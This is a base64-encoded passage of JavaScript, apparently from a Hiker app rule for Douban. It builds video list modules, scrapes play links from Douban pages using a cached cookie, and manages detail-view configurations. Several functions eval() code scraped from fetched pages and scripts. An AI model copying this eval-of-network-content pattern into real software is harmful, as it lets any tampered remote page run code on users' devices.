IFxcXCIgKyBlLmNvbnRlbnQuc3ViamVjdC5yYXRpbmcudmFsdWUudG9GaXhlZCgxKSArIFxcXCLliIZcXFwiIDogXFxcIuaaguaXoOivhOWIhlxcXCIpXFxyXFxuICAgICAgICB9XFxyXFxuICAgIH0pKTtcXHJcXG5cXHJcXG4gICAgc2V0SG9tZVJlc3VsdCh7XFxyXFxuICAgICAgICBkYXRhOiBwYWdlID4gMSA/IHIgOiBpLmNvbmNhdChyKVxcclxcbiAgICB9KVxcclxcbn1cXHJcXG5cXHJcXG5cXHJcXG5cXHJcXG4vL+inhumikeaooeWdl1xcclxcbmZ1bmN0aW9uIHZpZGVvVXJsc01vZHVsZShkLCB0eXBlLCBpZCwgY29sLCBsYXp5LCBfcmVzLCBleHRyYSkge1xcclxcbiAgICAvL2NvbOaYr+agt+W8j2NvbFswXSxjb2xbMV3liIbliKvmmK90duWSjG1vdmll55qE5qC35byPKHR25Lya5pyJ5YiG6ZuG5L+h5oGvdGl0bGXkvJrlvojplb8pXFxyXFxuICAgIGlmICghY29sKSBjb2wgPSBbJ2ljb25fMicsICdpY29uX3NtYWxsXzQnXTtcXHJcXG4gICAgaWYgKCFsYXp5KSBsYXp5ID0gJ3JldHVybiBpbnB1dCc7XFxyXFxuICAgIGxldCByZXMgPSBfcmVzIHx8IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFwiICsgdHlwZSArIFxcXCIvXFxcIiArIGlkKTtcXHJcXG4gICAgZm9yIChsZXQgaXRlbSBpbiByZXMudmVuZG9ycykge1xcclxcbiAgICAgICAgbGV0IGUgPSByZXMudmVuZG9yc1tpdGVtXTtcXHJcXG4gICAgICAgIGlmICh0eXBlID09PSBcXFwidHZcXFwiKSB7XFxyXFxuICAgICAgICAgICAgZC5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGUudGl0bGUgKyAoZS5lcGlzb2Rlc19pbmZvID8gXFxcIuKAolxcXCIgKyBlLmVwaXNvZGVzX2luZm8gOiBcXFwiXFxcIiksXFxyXFxuICAgICAgICAgICAgICAgIGltZzogZS5pY29uLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogY29sWzBdIHx8IFxcXCJpY29uXzJcXFwiLFxcclxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHk/aWQ9JyArIGlkICsgJyZ0eXBlPScgKyB0eXBlICsgJyZ0aXRsZT0nICsgZS50aXRsZSkucnVsZSgocmVzLCBpZCwgZSwgbGF6eSwgZXh0cmEpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0aXRsZSA9IHJlcy50aXRsZSxcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICBwaWMgPSByZXMucGljLm5vcm1hbCArIFxcXCJAUmVmZXJlcj1cXFwiICsgcmVzLnBpYy5ub3JtYWw7XFxyXFxuICAgICAgICAgICAgICAgICAgICBzZXRQYWdlVGl0bGUoZS50aXRsZSArICctJyArIHRpdGxlKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHRyeSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgc2V0UGFnZVBpY1VybChwaWMpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge31cXHJcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCB1cmxzID0gZ2V0VHZVcmxzKGlkLCBlLmlkKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxhenkgPSAkKFxcXCJcXFwiKS5sYXp5UnVsZShsYXp5ID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcmVzdWx0VXJsID0gXFxcInRvYXN0Oi8v6Kej5p6Q5aSx6LSlXFxcIjtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICB0cnkge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAobGF6eS5zdGFydHNXaXRoKFxcXCIoXFxcIikpIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2YWwoJ3Jlc3VsdFVybCA9ICcgKyBsYXp5KVxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZhbCgncmVzdWx0VXJsID0gJyArICcoKCkgPT4geycgKyBsYXp5ICsgJ30pKCknKVxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coZS5tZXNzYWdlKVxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0VXJsXFxyXFxuICAgICAgICAgICAgICAgICAgICB9LCBsYXp5KVxcclxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGQgPSBbXTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGlmICh0eXBlb2YodXJscykgPT0gXFxcIm9iamVjdFxcXCIpIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZCA9IFtdO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgdXJscy5sZW5ndGg7IGkrKykge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICfnrKwnICsgKGkgKyAxKSArICfpm4YnLFxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0XzQnLFxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBsYXp5ID8gdXJsc1tpXSArIGxhenkgOiB1cmxzW2ldLFxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXh0cmE6IGV4dHJhXFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHNldFJlc3VsdChkKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodHlwZW9mKHVybHMpID09IFxcXCJzdHJpbmdcXFwiICYmIHVybHMgPT0gJ+iiq+WwgWlwJykge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBydWxlID0gSlNPTi5wYXJzZShyZXF1ZXN0KFxcXCJoaWtlcjovL3BhZ2UvcmVsZWFzZUlQP3J1bGU96Z2S6LGGXFxcIikpXFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5ydWxlO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIGV2YWwocnVsZSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHR5cGVvZih1cmxzKSA9PSAnc3RyaW5nJyAmJiB1cmxzID09ICfmsqHmnInmlLblvZUnKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGQgPSBbXTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ+ixhueTo+ayoeacieaUtuW9leatpOinhumikea6kOeahOivpue7huS/oeaBrycsXFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6ICfngrnmiJHlj6/ku6Xljrvop4bpopHmupDnvZHnq5nnnIvnnIsnLFxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGUudXJsXFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICBzZXRSZXN1bHQoZCk7XFxyXFxuICAgICAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgIH0sIHJlcywgaWQsIGUsIGxhenksIGV4dHJhKVxcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICB9IGVsc2UgaWYgKHR5cGUgPT09ICdtb3ZpZScpIHtcXHJcXG4gICAgICAgICAgICBsZXQgbUxhenkgPSAkKFxcXCJcXFwiKS5sYXp5UnVsZShsYXp5ID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgbGV0IHJlc3VsdFVybCA9IFxcXCJ0b2FzdDovL+ino+aekOWksei0pVxcXCI7XFxyXFxuICAgICAgICAgICAgICAgIHRyeSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBpZiAobGF6eS5zdGFydHNXaXRoKFxcXCIoXFxcIikpIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICBldmFsKCdyZXN1bHRVcmwgPSAnICsgbGF6eSlcXHJcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXZhbCgncmVzdWx0VXJsID0gJyArICcoKCkgPT4geycgKyBsYXp5ICsgJ30pKCknKVxcclxcbiAgICAgICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBsb2coZS5tZXNzYWdlKVxcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHRVcmxcXHJcXG4gICAgICAgICAgICB9LCBsYXp5KVxcclxcbiAgICAgICAgICAgIGQucHVzaCh7XFxyXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBlLnRpdGxlICsgKGUuZXBpc29kZXNfaW5mbyA/IFxcXCLigKJcXFwiICsgZS5lcGlzb2Rlc19pbmZvIDogXFxcIlxcXCIpLFxcclxcbiAgICAgICAgICAgICAgICBpbWc6IGUuaWNvbixcXHJcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IGNvbFsxXSB8fCBcXFwiaWNvbl9zbWFsbF80XFxcIixcXHJcXG4gICAgICAgICAgICAgICAgdXJsOiBtTGF6eSA/IGUudXJsICsgbUxhenkgOiBlLnVybCxcXHJcXG4gICAgICAgICAgICAgICAgZXh0cmE6IGV4dHJhXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgIH1cXHJcXG4gICAgfVxcclxcbn1cXHJcXG5cXHJcXG4vL+iOt+WPlueUteinhuWJp+WIhumbhumTvuaOpSxpZOaYr+eJh+WtkOe8luWPtyx1aWTmmK/op4bpopHmupDnvJblj7dcXHJcXG5mdW5jdGlvbiBnZXRUdlVybHMoaWQsIHVpZCkge1xcclxcbiAgICBsZXQgY29va2llQ2FjaGUgPSAnaGlrZXI6Ly9maWxlcy9jYWNoZS9kb3ViYW5jb29raWUudHh0JztcXHJcXG4gICAgbGV0IG1VcmwgPSAnaHR0cHM6Ly9tb3ZpZS5kb3ViYW4uY29tL3N1YmplY3QvJyArIGlkICsgJy8nO1xcclxcbiAgICBsZXQgaGVhZGVycyA9IHtcXHJcXG4gICAgICAgIFxcXCJVc2VyLUFnZW50XFxcIjogUENfVUEsXFxyXFxuICAgIH1cXHJcXG4gICAgaWYgKGZpbGVFeGlzdChjb29raWVDYWNoZSkpIHtcXHJcXG4gICAgICAgIGhlYWRlcnNbXFxcIkNvb2tpZVxcXCJdID0gZmV0Y2goY29va2llQ2FjaGUpXFxyXFxuICAgIH1cXHJcXG4gICAgbGV0IGh0bWwgPSByZXF1ZXN0KG1VcmwsIHtcXHJcXG4gICAgICAgIGhlYWRlcnM6IGhlYWRlcnNcXHJcXG4gICAgfSlcXHJcXG4gICAgaWYgKChodG1sLmluY2x1ZGVzKFxcXCLnmbvlvZXot7PovaxcXFwiKSAmJiBodG1sLmluY2x1ZGVzKFxcXCLlvILluLjor7fmsYJcXFwiKSkgfHwgKGh0bWwuaW5jbHVkZXMoXFxcIndpbmRvdy5sb2NhdGlvbi5ocmVmXFxcIikgJiYgaHRtbC5pbmNsdWRlcyhcXFwic2VjLmRvdWJhblxcXCIpKSkge1xcclxcbiAgICAgICAgcmV0dXJuICfooqvlsIFpcCc7XFxyXFxuICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICBsZXQgcyA9IHtcXHJcXG4gICAgICAgICAgICBxcTogMSxcXHJcXG4gICAgICAgICAgICB5b3VrdTogMyxcXHJcXG4gICAgICAgICAgICBsZXR2OiA2LFxcclxcbiAgICAgICAgICAgIG1ndHY6IDcsXFxyXFxuICAgICAgICAgICAgYmlsaWJpbGk6IDgsXFxyXFxuICAgICAgICAgICAgaXFpeWk6IDksXFxyXFxuICAgICAgICAgICAgY250djogMTIsXFxyXFxuICAgICAgICAgICAgY2N0djY6IDEzLFxcclxcbiAgICAgICAgICAgIG1pZ3V2aWRlbzogMTUsXFxyXFxuICAgICAgICAgICAgeGlndWE6IDE3LFxcclxcbiAgICAgICAgICAgIGFjZnVuOiAxOCxcXHJcXG4gICAgICAgICAgICBtYWlkdWlkdWk6IDE5XFxyXFxuICAgICAgICB9O1xcclxcbiAgICAgICAgbGV0IG51bSA9IHNbdWlkXTtcXHJcXG5cXHJcXG4gICAgICAgIHZhciBzb3VyY2VzID0ge307XFxyXFxuICAgICAgICBsZXQgc2wgPSBodG1sLm1hdGNoKC9zb3VyY2VzXFxcXFtbMS05XXsxLDJ9XFxcXF1bXFxcXHNcXFxcU10qP1xcXFxdL2cpO1xcclxcbiAgICAgICAgaWYgKHNsKSB7XFxyXFxuICAgICAgICAgICAgZm9yICh2YXIgaSBpbiBzbCkge1xcclxcbiAgICAgICAgICAgICAgICBldmFsKHNsW2ldKTtcXHJcXG4gICAgICAgICAgICB9XFxyXFxuICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgIGxldCBzY3JpcHRfbGlzdCA9IHBhcnNlRG9tRm9yQXJyYXkoaHRtbCwgJ2JvZHkmJnNjcmlwdFtzcmNdJyk7XFxyXFxuICAgICAgICAgICAgbGV0IHNvdXJjZXNfdXJsID0gXFxcIlxcXCI7XFxyXFxuICAgICAgICAgICAgZm9yIChsZXQgaSBpbiBzY3JpcHRfbGlzdCkge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdXJsID0gcGFyc2VEb21Gb3JIdG1sKHNjcmlwdF9saXN0W2ldLCAnc2NyaXB0JiZzcmMnKTtcXHJcXG4gICAgICAgICAgICAgICAgaWYgKHVybC5pbmRleE9mKCdtaXhlZF9zdGF0aWMnKSAhPT0gLTEpIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHNvdXJjZXNfdXJsID0gdXJsO1xcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgIGxldCBzb3VyY2VzX2xpc3QgPSByZXF1ZXN0KHNvdXJjZXNfdXJsKS5tYXRjaCgvc291cmNlc1xcXFxbWzEtOV17MSwyfVxcXFxdW1xcXFxzXFxcXFNdKj9cXFxcXS9nKTtcXHJcXG4gICAgICAgICAgICBmb3IgKHZhciBpIGluIHNvdXJjZXNfbGlzdCkge1xcclxcbiAgICAgICAgICAgICAgICBldmFsKHNvdXJjZXNfbGlzdFtpXSk7XFxyXFxuICAgICAgICAgICAgfVxcclxcbiAgICAgICAgfVxcclxcblxcclxcbiAgICAgICAgbGV0IHJlbiA9IHNvdXJjZXNbbnVtXTtcXHJcXG4gICAgICAgIGlmIChyZW4gJiYgcmVuLmxlbmd0aCA+IDApIHtcXHJcXG4gICAgICAgICAgICAvKnZhciByID0gcmVuLm1hcChlID0+IHVuZXNjYXBlKGUucGxheV9saW5rLnJlcGxhY2UoLyhodHRwc3xodHRwKTpcXFxcL1xcXFwvd3d3LmRvdWJhbi5jb21cXFxcL2xpbmsyXFxcXC9cXFxcP3VybD0vLCAnJylcXHJcXG4gICAgICAgICAgICAgICAgLnNwbGl0KCc7JylbMF0uc3BsaXQoJy5odG1sJylbMF0gKyAnLmh0bWwnKSkqL1xcclxcbiAgICAgICAgICAgIHZhciByID0gcmVuLm1hcChlID0+IHVuZXNjYXBlKGUucGxheV9saW5rLnNwbGl0KCc/dXJsPScpWzFdLnNwbGl0KCcmJylbMF0pKVxcclxcblxcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgcmV0dXJuIHIgfHwgJ+ayoeacieaUtuW9lSc7XFxyXFxuICAgIH1cXHJcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLorr7nva7pobVcIixcInBhdGhcIjpcInNldHRpbmdQYWdlXCIsXCJydWxlXCI6XCJqczpcXG5ldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3V0aWxzJykpLnJ1bGUpO1xcblxcbi8v5b2x54mH6K+m5oOF6YWN572u5qih5Z2XXFxuZnVuY3Rpb24gZGV0YWlsVmlld01vZGVNb2R1bGUoZCwgZGV0YWlsc1ZpZXdDb25maWdzKSB7XFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfoh6rlrprkuYnlvbHniYfor6bmg4XpobXpnaInLmJvbGQoKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcbiAgICB9KVxcbiAgICBmb3IgKGxldCBjb25maWdLZXkgb2YgT2JqZWN0LmtleXMoZGV0YWlsc1ZpZXdDb25maWdzKSkge1xcbiAgICAgICAgaWYgKGNvbmZpZ0tleSA9PT0gJ3VzZScpIGNvbnRpbnVlO1xcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogY29uZmlnS2V5ID09PSBkZXRhaWxzVmlld0NvbmZpZ3MudXNlID8gXFxcIuKAnOKAnFxcXCIgKyBjb25maWdLZXkgKyBcXFwi4oCd4oCdXFxcIiA6IGNvbmZpZ0tleSxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcImhpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKGNvbmZpZ0tleSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHJlcXVlc3QoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpXFxuICAgICAgICAgICAgICAgIGlmIChjb25maWcuZGV0YWlsc1ZpZXdDb25maWdzLnVzZSA9PT0gY29uZmlnS2V5KSB7XFxuICAgICAgICAgICAgICAgICAgICAvL3B1dE15VmFyKFxcXCJpbnB1dF9jb25maWdfdHlwZVxcXCIsICflvbHniYfor6bmg4XpobXpnaLphY3nva4nKVxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X25hbWVcXFwiLCBjb25maWdLZXkpO1xcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X2NvZGVcXFwiLCBjb25maWcuZGV0YWlsc1ZpZXdDb25maWdzW2NvbmZpZ0tleV0uY29uZmlnKTtcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJpbnB1dF9zZXR0aW5nX2NvZGVcXFwiLCBjb25maWcuZGV0YWlsc1ZpZXdDb25maWdzW2NvbmZpZ0tleV0uc2V0dGluZyB8fCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWRldGFpbFZpZXdNb2RlRWRpdFBhZ2UnO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGNvbmZpZy5kZXRhaWxzVmlld0NvbmZpZ3MudXNlID0gY29uZmlnS2V5XFxuICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/liIfmjaLmiJDlip8nXFxuICAgICAgICAgICAgfSwgY29uZmlnS2V5KSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJ1xcbiAgICAgICAgfSlcXG4gICAgfVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6ICdibGFua19ibG9jaydcXG4gICAgfSlcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn4p6VJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3J1bGU96Z2S6LGGJnZpZXc9ZGV0YWlsVmlld01vZGVFZGl0UGFnZSdcXG4gICAgfSk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJ+KelicsXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXG4gICAgICAgIHVybDogJChPYmplY3Qua2V5cyhkZXRhaWxzVmlld0NvbmZpZ3MpLmZpbHRlcihjb25maWdLZXkgPT4gY29uZmlnS2V5ICE9PSAndXNlJyAmJiBjb25maWdLZXkgIT09ICfpu5jorqQnKSwgMilcXG4gICAgICAgICAgICAuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0ID09PSAn6buY6K6kJykgcmV0dXJuICd0b2FzdDovL+m7mOiupOmFjee9ruaXoOazleWIoOmZpO+8gSdcXG4gICAgICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSlcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0ID09PSBjb25maWcuZGV0YWlsc1ZpZXdDb25maWdzLnVzZSkgcmV0dXJuICd0b2FzdDovL+ivpemFjee9ruato+WcqOS9v+eUqO+8jOaXoOazleWIoOmZpO+8gSdcXG4gICAgICAgICAgICAgICAgcmV0dXJuICQoJ+ehruiupOWIoOmZpFxcXCInICsgaW5wdXQgKyAnXFxcIu+8nycpLmNvbmZpcm0oKGNvbmZpZywgY29uZmlnS2V5KSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBkZWxldGUgY29uZmlnLmRldGFpbHNWaWV3Q29uZmlnc1tjb25maWdLZXldXFxuICAgICAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSlcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/liKDpmaQnICsgY29uZmlnS2V5ICsgJ+aIkOWKnydcXG4gICAgICAgICAgICAgICAgfSwgY29uZmlnLCBpbnB1dClcXG4gICAgICAgICAgICB9KVxcbiAgICB9KVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfwn5OdJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGRldGFpbHNWaWV3Q29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnKSwgMikuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICAvLyBpZiAoaW5wdXQgPT09ICfpu5jorqQnKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6YWN572u5peg5rOV57yW6L6R77yBJ1xcbiAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHJlcXVlc3QoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X25hbWVcXFwiLCBjb25maWdLZXkpO1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCJpbnB1dF9jb2RlXFxcIiwgY29uZmlnLmRldGFpbHNWaWV3Q29uZmlnc1tjb25maWdLZXldLmNvbmZpZyk7XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X3NldHRpbmdfY29kZVxcXCIsIGNvbmZpZy5kZXRhaWxzVmlld0NvbmZpZ3NbY29uZmlnS2V5XS5zZXR0aW5nIHx8IFxcXCJcXFwiKTtcXG4gICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9zZXR0aW5nLWVkaXRvcj9ydWxlPemdkuixhiZ2aWV3PWRldGFpbFZpZXdNb2RlRWRpdFBhZ2UnXFxuICAgICAgICB9KVxcbiAgICB9KVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfwn5OlJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKFxcXCJcXFwiLCBcXFwi6K+36L6T5YWl5Y+j5LukXFxcIikuaW5wdXQoKCkgPT4ge1xcbiAgICAgICAgICAgIGlmICghaW5wdXQuaW5jbHVkZXMoXFxcIuW9seeJh+ivpuaDhemhtemdoumFjee9rlxcXCIpKSByZXR1cm4gXFxcInRvYXN0Oi8v6K+l5Y+j5Luk5LiN5piv5b2x54mH6K+m5oOF6aG16Z2i6YWN572uXFxcIjtcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3V0aWxzJykpLnJ1bGUpXFxuICAgICAgICAgICAgbGV0IGltcG9ydENvbmZpZ3MgPSBDb25maWdUb29sLmltcG9ydChpbnB1dCk7XFxuICAgICAgICAgICAgaWYgKCFpbXBvcnRDb25maWdzKSByZXR1cm4gXFxcInRvYXN0Oi8v5Ly85LmO5Ye65LqG6ZSZ77yM6K+35bCd6K+V5YaN5qyh5a+85YWl772eXFxcIjtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfbmFtZVxcXCIsIGltcG9ydENvbmZpZ3MubmFtZSk7XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcImlucHV0X2NvZGVcXFwiLCBpbXBvcnRDb25maWdzLmRhdGEuY29uZmlnKTtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiaW5wdXRfc2V0dGluZ19jb2RlXFxcIiwgaW1wb3J0Q29uZmlncy5kYXRhLnNldHRpbmcgfHwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3J1bGU96Z2S6LGGJnZpZXc9ZGV0YWlsVmlld01vZGVFZGl0UGFnZSc7XFxuICAgICAgICB9KVxcbiAgICB9KVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfwn5OkJyxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcbiAgICAgICAgdXJsOiAkKE9iamVjdC5rZXlzKGRldGFpbHNWaWV3Q29uZmlncykuZmlsdGVyKGNvbmZpZ0tleSA9PiBjb25maWdLZXkgIT09ICd1c2UnKSwgMikuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICAvLyBpZiAoaW5wdXQgPT09ICfpu5jorqQnKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6YWN572u5peg5rOV57yW6L6R77yBJ1xcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gZ2V0Q29uZmlnKCk7XFxuICAgICAgICAgICAgbGV0IHNlbGVjdENvbmZpZyA9IHtcXG4gICAgICAgICAgICAgICAgbmFtZTogaW5wdXQsXFxuICAgICAgICAgICAgICAgIGRhdGE6IGNvbmZpZy5kZXRhaWxzVmlld0NvbmZpZ3NbaW5wdXRdXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiAkKENvbmZpZ1Rvb2wuZW5jVHlwZUxpc3QsIDIpLnNlbGVjdCgoc2VsZWN0Q29uZmlnKSA9PiB7XFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuIENvbmZpZ1Rvb2wudG9DbGlwYm9hcmQoQ29uZmlnVG9vbC5leHBvcnQoc2VsZWN0Q29uZmlnLm5hbWUsIHNlbGVjdENvbmZpZywgXFxcIuW9seeJh+ivpuaDhemhtemdoumFjee9rlxcXCIsIGlucHV0KSlcXG4gICAgICAgICAgICB9LCBzZWxlY3RDb25maWcpXFxuICAgICAgICB9KVxcbiAgICB9KVxcbn1cXG4vLyDor6bmg4XpobXorr7nva7mqKHlnZdcXG5mdW5jdGlvbiBkZXRhaWxWaWV3U2V0dGluZ01vZHVsZShkKSB7